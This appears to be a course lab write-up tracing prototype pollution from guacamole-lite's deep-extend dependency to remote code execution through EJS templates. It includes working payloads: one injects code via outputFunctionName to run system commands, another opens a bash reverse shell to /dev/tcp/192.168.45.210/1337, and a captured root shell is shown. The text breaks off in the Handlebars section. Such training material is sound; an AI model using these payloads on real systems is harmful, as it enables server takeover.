The deeper we get into the dependency tree, the less likely we are to find an exploitable vulnerability. The dependencies of dependencies are less likely to have code that we can actually reach. This is true with almost all JavaScript vulnerabilities inside third-party libraries. To compensate for this, we'll also provide the argument `-depth 1` to ensure we are only obtaining the list of packages and their immediate dependencies.

```bash
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 1
Creating chips_chips_run ... done
app@0.0.0 /usr/src/app
...
+-- ejs@3.1.6
| `-- jake@10.8.2
+-- express@4.16.4
| +-- accepts@1.3.7
...
| +-- fresh@0.5.2
| +-- merge-descriptors@1.0.1
| +-- methods@1.1.2
...
| +-- type-is@1.6.18
| +-- utils-merge@1.0.1
| `-- vary@1.1.2
+-- guacamole-lite@0.6.3
| +-- deep-extend@0.4.2
| +-- moment@2.29.1
| `-- ws@1.1.5
....
```
We will search this list for anything that might merge or extend objects. We can find three libraries with names that suggests they might do this: 
- **`merge-descriptors`**
- **`utils-merge`**
- **`deep-extend`**

Reviewing the GitHub repos and source code for `merge-descriptors` and `utils-merge`, we find that these basically implement the `badMerge` function we discussed earlier. That makes these libraries immune to prototype pollution.

However, `deep-extend` might be interesting as it's described as a library for `"Recursive object extending"`.

In order to ensure we are reviewing the correct version of the `deep-extend` library, we will use the source code of the library found in `node_modules`. The main library code can be found in `node_modules/deep-extend/lib/deep-extend.js`.
```javascript
...
82  var deepExtend = module.exports = function (/*obj_1, [obj_2], [obj_N]*/) {
...
91    	var target = arguments[0];
94      var args = Array.prototype.slice.call(arguments, 1);
95
96      var val, src, clone;
97
98      args.forEach(function (obj) {
99         // skip argument if isn't an object, is null, or is an array
100         if (typeof obj !== 'object' || obj === null || Array.isArray(obj)) {
101                 return;
102         }
103
104         Object.keys(obj).forEach(function (key) {
105           src = target[key]; // source value
106           val = obj[key]; // new value
...
109           if (val === target) {
110              return;
...
116           } else if (typeof val !== 'object' || val === null) {
117              target[key] = val;
118              return;
...
136           } else {
137              target[key] = deepExtend(src, val);
138              return;
139           }
140         });
141      });
142
143      return target;
144  }
```
The `deep-extend` shows a code block fairly similar to the vulnerable `merge` function we discussed earlier. 

The first argument to the `deepExtend` function will become the target object to extend (line 91) and the remaining arguments will be looped through (line 98). In our merge example, we accepted two objects. In `deep-extend`, the library will theoretically process an infinite number of objects. The keys of the subsequent objects will be looped through and, if the value of the key is not an object (line 116), the key of the target will be set to the value of the object to be merged. If the value is an object (line 136), `deepExtend` will recursively call itself, merging the objects. Nowhere in the source code would an object with the `"__proto__"` key be removed.

**This is a perfect example of a library vulnerable to prototype pollution.**

The vulnerability in this specific example is well-known. However, the latest version of guacamole-lite (at the time of this writing) has not updated the library to the latest version. Because of this, we could also use `npm audit` to discover the vulnerable library as well.

```bash
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm audit
Creating chips_chips_run ... done
                                                                                
                       === npm audit security report ===                        
                                                                                
                                                                                
                                 Manual Review                                  
             Some vulnerabilities require your attention to resolve             
                                                                                
          Visit https://go.npm.me/audit-guide for additional guidance           
                                                                                
                                                                                
  Low             Prototype Pollution                                           
                                                                                
  Package         deep-extend                                                   
                                                                                
  Patched in      >=0.5.1                                                       
                                                                                
  Dependency of   guacamole-lite                                                
                                                                                
  Path            guacamole-lite > deep-extend                                  
                                                                                
  More info       https://npmjs.com/advisories/612                              
                                                                                
found 1 low severity vulnerability in 1071 scanned packages
  1 vulnerability requires manual review. See the full report for details.
ERROR: 1
```
However, this won't always be the case, and knowing how to manually find packages like this is an important skill.

Many developers don't bother to fix issues like this because they are reported as "low" risk. As we'll find later, these are certainly not low-risk issues when paired with a proper exploit.

Now that we've discovered a library that is vulnerable to prototype pollution, let's find where it is used. The `npm list` command showed us that this was found in the guacamole-lite library.

First, let's review the directory structure of `node_modules/guacamole-lite` so we know which files to review.

```bash
├── index.js
├── lib
│   ├── ClientConnection.js
│   ├── Crypt.js
│   ├── GuacdClient.js
│   └── Server.js
├── LICENSE
├── package.json
└── README.md
```

The `LICENSE`, `package.json`, and `README.md` files can be safely ignored. The `index.js` file only exports the `Server.js` file, which initializes the library. We'll start our review with `Server.js`.

```javascript
001  const EventEmitter = require('events').EventEmitter;
002  const Ws = require('ws');
003  const DeepExtend = require('deep-extend');
004
005  const ClientConnection = require('./ClientConnection.js');
006
007  class Server extends EventEmitter {
008
009    constructor(wsOptions, guacdOptions, clientOptions, callbacks) {
...
034      DeepExtend(this.clientOptions, {
035        log: {
...
039        },
040
041        crypt: {
042          cypher: 'AES-256-CBC',
043        },
044
045        connectionDefaultSettings: {
046          rdp: {
047            'args': 'connect',
048            'port': '3389',
049            'width': 1024,
050            'height': 768,
051            'dpi': 96,
052          },
...
074        },
075
076        allowedUnencryptedConnectionSettings: {
...
103       }
104
105     }, clientOptions);
...
133   }
...
147   newConnection(webSocketConnection) {
148     this.connectionsCount++;
149     this.activeConnections.set(this.connectionsCount, new ClientConnection(this, this.connectionsCount, webSocketConnection));
150    }
151  }
152
153  module.exports = Server;
```
Within `Server.js`, we find that the `DeepExtend` library is indeed imported on line 3 and used on line 34. However, this is only used to initialize the `guacamole-lite` server. As the name implies, client connections are handled by `ClientConnection.js`, according to lines 5 and 149. This is initialized when a new connection is made.

While this file is vulnerable to prototype pollution, it is not exploitable using user-supplied data, as the arguments passed to DeepExtend here are passed when the server is initialized and no user-controlled input is accepted at that time.

This initialization is found in `bin/www`.

```javascript
...
10  const GuacamoleLite = require('guacamole-lite');
11  const clientOptions = require("../settings/clientOptions.json")
12  const guacdOptions = require("../settings/guacdOptions.json");
...
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions);
...
```

The library is initialized with `guacdOptions` and `clientOptions` which are loaded from JSON files, not user input.

However, since the requests that might contain user input are handled by the `node_modules/guacamole-lite/lib/ClientConnection.js`, this file is worth reviewing.

```javascript
001  const Url = require('url');
002  const DeepExtend = require('deep-extend');
003  const Moment = require('moment');
004 
005  const GuacdClient = require('./GuacdClient.js');
006  const Crypt = require('./Crypt.js');
007 
008  class ClientConnection {
009 
010    constructor(server, connectionId, webSocket) {
...
023
024      try {
025        this.connectionSettings = this.decryptToken();
...
029        this.connectionSettings['connection'] = this.mergeConnectionOptions();
030
031      } 
...
054    }
...
132    mergeConnectionOptions() {
...
140      let compiledSettings = {};
141
142      DeepExtend(
143        compiledSettings,
144        this.server.clientOptions.connectionDefaultSettings[this.connectionType],
145        this.connectionSettings.connection.settings,
146        unencryptedConnectionSettings
147      );
148
149      return compiledSettings;
150    }
...
159  }
...
```
We again find that the `deep-extend` library is imported into this file on line 2. This is a good sign for us. We also find that the constructor will first decrypt a token on line 25 and save it to the `this.connectionSettings` variable. The `token` parameter we found earlier was encrypted.

After the token is decrypted, the file will run `mergeConnectionOptions`, which calls `deep-extend` (lines 142-147) with the most notable arguments being the decrypted `settings` from the user input (line 145). More specifically, the `settings` object within the `connection` object is passed to the `DeepExtend` function. This is why the payload worked in the `settings` object during blackbox discovery, but not the connection object.

Now that we understand where and why the application is vulnerable, let's move on to doing something more useful than denial of service.

</details>

## Prototype Pollution Exploitation
A useful prototype pollution exploit is application- and library-dependent.

For example, if the application has `admin` and `non-admin` users, it might be possible to set `isAdmin` to `true` in the Object prototype, convincing the application that all users are administrators. However, this also assumes that non-admin users never have the `isAdmin` parameter explicitly set to `false`. If `isAdmin` was set to `false` in the object directly, the prototype chain wouldn't be used for that variable.

**As with most web applications, our ultimate goal is achieving remote code execution. With prototype pollution, we may be able to reach code execution if we find a point in the application where undefined variables are appended to a `child_process.exec`, `eval` or `vm.runInNewContext` function, or similar.**

<details>
  <summary><b>Click to expand</b></summary>

Consider the following example code:
```javascript
function runCode (code, o) {
  let logCode = ""
  if (o.log){
    if (o.preface){
      logCode = "console.log('" + o.preface + "');"
    }
    logCode += "console.log('Running Eval');"
  }

  eval(logCode + code);
}

options = {"log": true}

runCode("console.log('Running some random code')", options)
```
The code shows us the types of code blocks we should search for that would let us reach code execution. In this example, the log key in the options object is explicitly set to `true`. However, the preface is not explicitly set. If we injected a payload into the preface key in the Object prototype before options is set, we would be able to execute arbitrary JavaScript code.

```javascript
> {}.__proto__.preface = "');console.log('RUNNING ANY CODE WE WANT')//"
"');console.log('RUNNING ANY CODE WE WANT')//"

> options = {"log": true}
{ log: true }

> runCode("console.log('Running some random code')", options)

RUNNING ANY CODE WE WANT
undefined
```

As shown, we were successfully able to inject our own `console.log` statement and comment out the others.

Third-party libraries often contain these types of code blocks, and developers may implement them without realizing the risk.

Let's review the non-development dependencies again. This time, we will run `npm list` with `-depth 0` since we're attempting to exploit the packages immediately available to us. If we don't find anything to exploit here, we could increase the depth. However, as we increase the depth, we also decrease the likelihood of finding a viable execution path.

```bash
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 0
Creating chips_chips_run ... done
app@0.0.0 /usr/src/app
+-- cookie-parser@1.4.5
+-- debug@2.6.9
+-- dockerode@3.2.1
+-- dotenv@8.2.0
+-- ejs@3.1.6
+-- express@4.16.4
+-- guacamole-lite@0.6.3
+-- hbs@4.1.1
+-- http-errors@1.6.3
+-- morgan@1.9.1
`-- pug@3.0.2
```
The packages that are worth investigating include `dockerode`, `ejs`, `hbs`, and `pug`. At first glance, `dockerode` seems like the type of library that would run system commands to control Docker. However, in practice it uses requests sent to the socket. While this may still lead to command execution, we did not discover an attack vector for prototype pollution in this package.

The three templating engine packages, `ejs`, `hbs`, and `pug`, are a different story. JavaScript templating engines often compile a template into JavaScript code and evaluate the compiled template. A library like this is perfect for our purposes. If we can find a way to inject code during the compilation process or during the conversion to JavaScript code, we might be able to achieve command execution.

</details>

## EJS
Let's start by reviewing EJS. We'll begin by attempting to use prototype pollution to crash the application. This will confirm that the server is running with EJS (which would be useful in a blackbox situation).

Once this proof of concept is complete, we'll attempt to obtain RCE.

### EJS — Proof of Concept

<details>
  <summary><b>Click to expand</b></summary>

One of the components that make EJS simpler than Pug and Handlebars is that EJS lets developers write pure JavaScript to generate templates. Other templating engines, like Pug and Handlebars are essentially separate languages that must be parsed and compiled into JavaScript.

Let's begin by starting Node in the application container of the target server. We'll again use the `docker-compose command with the exec` directive to execute a command in the chips container. We'll run the node command to start the interactive CLI.

```bash
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> 
```

Now that we have our interactive CLI running, let's render an EJS template. According to the documentation, we can render a template by using the `compile` function or the `render` function:
```javascript
let template = ejs.compile(str, options);
template(data);
// => Rendered HTML string

ejs.render(str, data, options);
// => Rendered HTML string
```
Let's inspect the compile function in our IDE by opening `node_modules/ejs/lib/ejs.js`. The relevant code starts on line 379.
```javascript
379  exports.compile = function compile(template, opts) {
380    var templ;
381  
382    // v1 compat
383    // 'scope' is 'context'
384    // FIXME: Remove this in a future version
385    if (opts && opts.scope) {
386      if (!scopeOptionWarned){
387        console.warn('`scope` option is deprecated and will be removed in EJS 3');
388        scopeOptionWarned = true;
389      }
390      if (!opts.context) {
391        opts.context = opts.scope;
392      }
393      delete opts.scope;
394    }
395    templ = new Template(template, opts);
396    return templ.compile();
397  };
```

The `compile` function accepts two arguments: a template string and an options object. After checking for deprecated options, a variable is created from the `Template` class and the compile function is executed within the `Template` object.

A quick review of the `render` function reveals that it is a wrapper for the `compile` function with a cache. Let's try executing both functions with a simple template.
```bash
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.

> let ejs = require('ejs');
undefined

> let template = ejs.compile("Hello, <%= foo %>", {})
undefined

> template({"foo":"world"})
'Hello, world'

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, {})
'Hello, world'
```
Next, we provide the `compile` and `render` functions a template, some data, and options. The response is a compiled Javascript function. When run, the function outputs `"Hello, World"`.

Let's review the `Template` class in search of a prototype pollution exploit vector.

```javascript
507  function Template(text, opts) {
508    opts = opts || {};
509    var options = {};
510    this.templateText = text;
511    /** @type {string | null} */
512    this.mode = null;
513    this.truncate = false;
514    this.currentLine = 1;
515    this.source = '';
516    options.client = opts.client || false;
517    options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
518    options.compileDebug = opts.compileDebug !== false;
519    options.debug = !!opts.debug;
520    options.filename = opts.filename;
521    options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
522    options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
523    options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
524    options.strict = opts.strict || false;
525    options.context = opts.context;
...
```
Reviewing the beginning of the `Template` class, we find that the options `object` is parsed from lines 516-525. However, many values are only set if the value exists. This is a perfect location to inject with a prototype pollution vulnerability.

The `escapeFunction` value is set to the `opts.escape` value. If we remember the modifications to the `toString` function, when an application or library expects a function but instead receives a string, the application crashes.

Let's set this option to a function, as the application expects, and review the output.

```javascript
> o = {
...   "escape" : function (x) {
.....     console.log("Running escape");
.....     return x;
.....   }
... }
{ escape: [Function: escape] }

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o)
Running escape
'Hello, world'
```

Our escape function accepts a parameter(`x`), logs a message, and returns the `x` parameter. When rendering a template with the `escape` function, the message is logged and the template is returned.

Next, let's replace the function with a string, and observe the error.

```javascript
> o = {"escape": "bar"}
{ escape: 'bar' }

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o)
Uncaught TypeError: esc is not a function
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18)
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), <anonymous>:15:3)
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17)
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37)
```

As expected, the application throws an error. We can also verify that we can inject into this option with prototype pollution by polluting the Object prototype and passing in an empty object.

```javascript
> {}.__proto__.escape = "haxhaxhax"
'haxhaxhax'

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, {})
Uncaught TypeError: esc is not a function
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18)
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), <anonymous>:15:3)
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17)
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37)
```

This also returns an error. However, this is great for us because we can determine if the target application is running EJS. If a prototype pollution vulnerability sets `escape` to a string, and the application crashes, we know we are dealing with an application running EJS.

Let's attempt to crash our target application. In our payload, we'll set escape to a string, generate a token, and use that token to load a guacamole-lite session.

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "escape": "foorbar"
      }
    }
  }
}

```
With the token generated, let's send the request to guacamole-lite and exploit the prototype pollution. This time, we'll send the request directly to the `/guaclite` endpoint instead of `/rdp` so we can keep this process in BurpSuite.

```text
http://chips/guaclite?token=eyJpdiI6IkpTNlBqbnVOYU5mZ1Z4emhISDdtRWc9PSIsInZhbHVlIjoiUERjZEUxMEN0QXRRalFPczJOZ3dkY094L2hYdGtUNUhpcjcxb3NOc1M3enZLVUpSY0pZdmNSZU1wQ2NzcDBHelVCMXB1L0NzN3ZmeVNiaU5FRERmVTE4M1BnL0dNU2pCSy9PRi9QVjJ3bUZNc2k5SDFmUDVnSDBvN1dSekFua3NvR09uWU1OMWg5Qi9hbnZ5MjFobUJpT1JnTFUrUTJJOUh4MjR2TUhZWlRZZS9Kd1dGV1lHQURCTXNPQUxzS3FZejhNaGx0ZkhyM1ZGUDhyS1ExU29pVDdKT0Vjd0sxSGREZnpuWlZKeTY4Z2RtbXVxVTM0LzlMWUtxa1F0SDVORzFQd0h1RlA0RlVsZ0MwOW10Tlh3alBBMmtaUmJuK3RyQ2pDM0tlMkFMSnI1aWZKSkltNXZyYmszemdnV3IreEIifQ==&width=1632&height=815
```

The response indicates a switch to the WebSocket protocol, which means the token was processed. However, when a new page is loaded, the application crashes.

While it might seem that we are in the same position as we were earlier when we overwrote the `toString` function, we have discovered something that is very useful. In blackbox scenarios, the `toString` function is a great method to discover if the application is vulnerable to prototype pollution. However, this EJS proof of concept can be used to narrow down the templating engine that is being used in the application.

Next, let's attempt to obtain RCE using EJS.

</details>

### EJS — Remote Code Execution
At this point, we've learned that templating engines compile the template into a JavaScript function. The most natural progression to achieve RCE would be to inject custom JavaScript into the template function during compilation. When the template function executes, so would our injected code. Let's review how a template is rendered in EJS.

<details>
  <summary><b>Click to expand</b></summary>

```javascript
let template = ejs.compile(str, options);
template(data);
// => Rendered HTML string
```

We'll again review the compile function in our IDE by opening `node_modules/ejs/lib/ejs.js`.

```javascript
379  exports.compile = function compile(template, opts) {
380    var templ;
381  
382    // v1 compat
383    // 'scope' is 'context'
384    // FIXME: Remove this in a future version
385    if (opts && opts.scope) {
386      if (!scopeOptionWarned){
387        console.warn('`scope` option is deprecated and will be removed in EJS 3');
388        scopeOptionWarned = true;
389      }
390      if (!opts.context) {
391        opts.context = opts.scope;
392      }
393      delete opts.scope;
394    }
395    templ = new Template(template, opts);
396    return templ.compile();
397  };
```
The last step in this compile function is to run the `Template.compile` function. We will start reviewing from this last step to find if we can inject into the template near the end of the process. This will lower the risk of the prototype pollution interfering with normal operation of the application and our payload has less chance of getting modified in the process.

The `Template.compile` function is defined in the same source file starting on line 569.
```javascript
569    compile: function () {
...
574      var opts = this.opts;
...
584      if (!this.source) {
585        this.generateSource();
586        prepended +=
587          '  var __output = "";\n' +
588          '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
589        if (opts.outputFunctionName) {
590          prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
591        }
...
609      }
```

The `compile` function in the `Template` class is relatively small and we quickly discover a vector for prototype pollution. On line 589, the code checks if the `outputFunctionName` variable within the `opts` object exists. If the variable does exist, the variable is added to the content.

A quick search through the code finds that this variable is only set by a developer using the EJS library. The documentation states that this variable is:

```javascript
Set to a string (e.g., 'echo' or 'print') for a function to print output inside scriptlet tags.
```

In practice, it can be used as follows:
```javascript
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> ejs  = require("ejs")

> ejs.render("hello <% echo('world'); %>", {}, {outputFunctionName: 'echo'});
'hello world'
```

The `outputFunctionName` is typically not set in templates. Because of this, we can most likely use it to inject with prototype pollution.

Let's examine the string that we would be injecting into on line 590 of `node_modules/ejs/lib/ejs.js`.

```javascript
 'var ' + opts.outputFunctionName + ' = __append;'
```

For this to work, our payload will need to complete the variable declaration on the left side, add the code we want to run in the middle, and complete the variable declaration on the right side. If our payload makes the function invalid, EJS will crash when the page is rendered.

```javascript
 var x = 1; WHATEVER_JSCODE_WE_WANT ; y = __append;'
```
The highlighted portion in Listing 64 shows what our payload may be. Let's use the interactive CLI to attempt to log something to the console.
```javascript
> ejs  = require("ejs")
...
> ejs.render("Hello, <%= foo %>", {"foo":"world"})
'Hello, world'

> {}.__proto__.outputFunctionName = "x = 1; console.log('haxhaxhax') ; y"
"x = 1; console.log('haxhaxhax') ; y"

> ejs.render("Hello, <%= foo %>", {"foo":"world"})
haxhaxhax
'Hello, world'
```

Now that we've confirmed our approach works via the interactive CLI, let's attempt to exploit this in the target application.

*Note: Make sure that the `TEMPLATING_ENGINE` is set to `'ejs'` when starting docker-compose. This will ensure we are using the ejs templating engine.*

This time, we'll use a payload that will execute a system command and output the response to the console.

</details>

```json
"__proto__":
{
    "outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
}
```
We'll set the payload in the proper request location.

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "outputFunctionName": "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
      }
    }
  }
}

```
Once the token is returned, we'll use it to pollute the prototype.
```text
http://chips/rdp?token=eyJpdiI6ImtnTE5FUjltUi9NR0hIREdNaDh6a2c9PSIsInZhbHVlIjoiZEo2ZTNpa2h4UDJ6Zi94SjR4NHlTWmpDWEJvZ2sxdWxaRlpBY24zZVFFMGs5bHQ3eTRSTGVqUk1RbVJPWmxjYzdkSGJJZDVKOWxSd09PS2EvS1FucCtHNEdUcWFkc1hBRzdJbFF4RWdnWk5YL3RUamFJenF2VEJyNGJ4WmdZY2ZqU0RZL1p4cGllZlo4Sk85UHRCVXg1Vmc5U2hLMXU4WEUwNVZDR0tmVk5RNy9vOTNCNUt5Y0FIeUVMZ3JVOUZuMkswS2lzTGZWK1VZRVBRUzg4U2x3MjhaYW9Pc1NidWFUWUdTWEg5bVRsVGlDWjduSFhxVWRzUUhGUHBsVk1IV3A1TDBvQm5sL05KcUV1QnViOHplVG5GSFVSR1E2RzE1cUhpbkZjMTlJQTJtODRwVWE1OWd0L0pyN05yVG0zd1VxSkNMUVBMdDRJRy9tazFLQlJBNFl2SUdoWWVhTGNEUVNwbGJCL1RCanlzYW1vd3VVTlE5bEJtWlRnbzFXZXhMR3dGSVFQL1RsUXFWOTlTRXVBNG1UTGNmQ2pWTXFwdlVLM1dKRGZMb3FuSGJDUUQwbEFkNXEwLzh6WTJlMGY3dWIyU3lKUml4aHVLd1kxTTMzb0J6Mnc9PSJ9&width=1632&height=815
```
Now, let's visit any page on the chips server and review the output of the log.
```bash
chips_1     | root
chips_1     | 
chips_1     | root
chips_1     | 
chips_1     | root
chips_1     | 
chips_1     | GET / 200 32.799 ms - 4962
```
Excellent! Our `console.log` payload was executed three times, proving that we can execute code against the server.

#### Obtaining Reverse Shell
Send this request to `POST` `http://chips/token`
```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "outputFunctionName": "x = 1; console.log(process.mainModule.require('child_process').execSync('bash -c \"exec bash -i &>/dev/tcp/192.168.45.210/1337 <&1\"').toString()); y"
      }
    }
  }
}
```
Obtain the token and send it to `http://chips/rdp?token=`
```text
http://chips/rdp?token=eyJpdiI6ImIrT0FKbElBSlJSNUFDZElUNXVFS2c9PSIsInZhbHVlIjoiWmdvL1grRHlvcFhrTzNKWHJsbnRKSXB3ek9Gdms4MC9pbHB0WWQ2cVoya280TmpQb1lCR0dKbmZjdjY2RWU0STlnYjJaa2ZIMGxnY01BUlBMK3Q0cWtYbEVpaktYcmw1NmJBNTJmNWFTdmdwTlRuL0QwZmFzNjlxb21TNlRabFNVbHg0UlNMK25ZbVhlb2lndm5Bc3cvRUVGTnprdFZKWDdrSUxJa0VJU3VWbkVLczVZdDkwd3R5ZHZJa2dwWUtmd3VkRzFGNHpVRzZWUVZMV0x4Y25PdHl1b3FMaHN5Q2tZK2ZSSnNZUTBQU1h0MHFDU3hzbnBic09laXMySmprV2s3U1RKako4TjJlSnpXY1h5cVlpWnE3ZkhKaERkOGhiTVVYMXFNVVJOWEtpd3FvYWVyY3M1RE1hWThLN2ZVNk5XS2pRbWFNa2dOcDh2blJ5aExiUU1FUGhiNDRmQlRrcHRNeXZXbEY1czVzMVhTTUpCOUZzdWVrZjBlSng2NWx0b05zTkIvNXE5OXRaekZXcXlubnN4Q3Eza1R1d0ZXUXovMzNNSEIySDBiQUMrdjdiYUNYZ2xLSTF4amRjSkNuV2NDVlIxc0RWaUs3QnlhcDdWS1FYakxMSE9LZ0VqTGo1S01OVllCdURUa1NJWGdSU3N3VHpQT3M2MFV1UDM5bGdwazhmblpLVmxTc2F1QXh1cE84RWRBPT0ifQ==
```
***Note:** You might need to send the request multiple times or send a request to `http://chips/rdp?token=` with empty token*

Check your listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.210] from (UNKNOWN) [192.168.156.138] 39802
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7f5568c19094:/usr/src/app#
```
**Automation script:** [ejs_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Guacamole%20Lite/ejs_rce.py)
## Handlebars
Now that we've learned how to detect if the target application is running EJS and how to obtain command execution, let's do the same using Handlebars.
### Handlebars — Proof of Concept

<details>
  <summary><b>Click to expand</b></summary>

Before we begin, we will restart the application to use the handlebars templating engine
```bash
student@chips:~/chips$ docker-compose down
Stopping chips_chips_1 ... done
Stopping rdesktop      ... done
Stopping guacd         ... done
Removing chips_chips_1 ... done
Removing rdesktop      ... done
Removing guacd         ... done
Removing network chips_default

student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
...
```
**Unlike EJS, we do not need to crash an application to detect if it is running Handlebars. However, the size of the Handlebars library makes discovering paths that lead to exploitation labor-intensive.**

While Handlebars is written on top of JavaScript, it redefines basic functionality into its own templating language. For example, to loop through each item in an array, a Handlebars template would use the `each` helper.
```javascript
{{#each users}}
  <p>{{this}}</p>
{{/each}}
```
EJS, on the other hand, would have used JavaScript's `forEach` method.
```javascript
<% users.forEach(function(user){ %>
  <p><%= user %></p>
<% }); %>
```
Since Handlebars redefines some standard functions, its parsing logic is more complicated than EJS.

The main functionality of the Handlebars library is loaded from the `node_modules/handlebars/dist/cjs` directory. Let's analyze the directory structure to understand where to start reviewing.

```bash
├── handlebars
│   ├── base.js
│   ├── compiler
│   │   ├── ast.js
│   │   ├── base.js
│   │   ├── code-gen.js
│   │   ├── compiler.js
│   │   ├── helpers.js
│   │   ├── javascript-compiler.js
│   │   ├── parser.js
│   │   ├── printer.js
│   │   ├── visitor.js
│   │   └── whitespace-control.js
│   ├── decorators
│   │   └── inline.js
│   ├── decorators.js
│   ├── exception.js
│   ├── helpers
...
│   │   └── with.js
│   ├── helpers.js
│   ├── internal
...
│   │   └── wrapHelper.js
│   ├── logger.js
│   ├── no-conflict.js
│   ├── runtime.js
│   ├── safe-string.js
│   └── utils.js
├── handlebars.js
├── handlebars.runtime.js
└── precompiler.js
```
For Handlebars templates to be turned into something usable, they must be compiled. The compilation process is very similar to that of typical compiled languages, such as C.

The original text is first processed by a tokenizer or a lexer. This will convert the input stream into a set of tokens that will be parsed into an intermediate code representation. This process will identify open and close brackets, statements, end of files, and many other parts of a language before it is executed.

Within Handlebars, the tokenization and parsing is handled by the `compiler/parser.js` file. The parse process is initiated by `compiler/base.js`.

```javascript
...
13
14  var _parser = require('./parser');
15
16  var _parser2 = _interopRequireDefault(_parser);
...
33  function parseWithoutProcessing(input, options) {
34    // Just return if an already-compiled AST was passed in.
35    if (input.type === 'Program') {
36      return input;
37    }
38
39    _parser2['default'].yy = yy;
40
41    // Altering the shared object here, but this is ok as parser is a sync operation
42    yy.locInfo = function (locInfo) {
43      return new yy.SourceLocation(options && options.srcName, locInfo);
44    };
45
46    var ast = _parser2['default'].parse(input);
47
48    return ast;
49  }
50
51  function parse(input, options) {
52    var ast = parseWithoutProcessing(input, options);
53    var strip = new _whitespaceControl2['default'](options);
54
55    return strip.accept(ast);
56  }
```

The `parse` function generates an intermediate code representation (an AST) by first checking if the input is already a `Program` type. If not, it parses the input using the parser file. This check gives us flexibility: we can pass either a template string or a pre-built AST. In both cases, the function strips whitespace before returning the cleaned-up AST. This behavior is key when analyzing Handlebars templates via the interactive CLI.

```javascript
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/575b6cc3-001e-4db5-abfd-b87175223311
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> Handlebars = require("handlebars")
...
}
> ast = Handlebars.parse("hello {{ foo }}")
{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}

> Handlebars.parse(ast)
{
  type: 'Program',
  body: [
...
  ],
  strip: {},
  loc: {
...
  }
}
```
In the code above, calling `parse` with a template string like `"hello {{ foo }}"` returns an AST containing a `ContentStatement` for the static text and a `MustacheStatement` for the expression, along with a `type` set to `"Program"`. If we call `parse` again with this AST, it returns the same object without re-parsing—this expected behavior will be useful when crafting the final payload.

Once the intermediate code representation is generated, it needs to be converted to operation codes, which will later be used to compile the final JavaScript code. To observe this process, we can review the `precompile` function in `compiler/compiler.js`.

```javascript
472  function precompile(input, options, env) {
473    if (input == null || typeof input !== 'string' && input.type !== 'Program') {
474      throw new _exception2['default']('You must pass a string or Handlebars AST to Handlebars.precompile. You passed ' + input);
475    }
476
477    options = options || {};
478    if (!('data' in options)) {
479      options.data = true;
480    }
481    if (options.compat) {
482      options.useDepths = true;
483    }
484
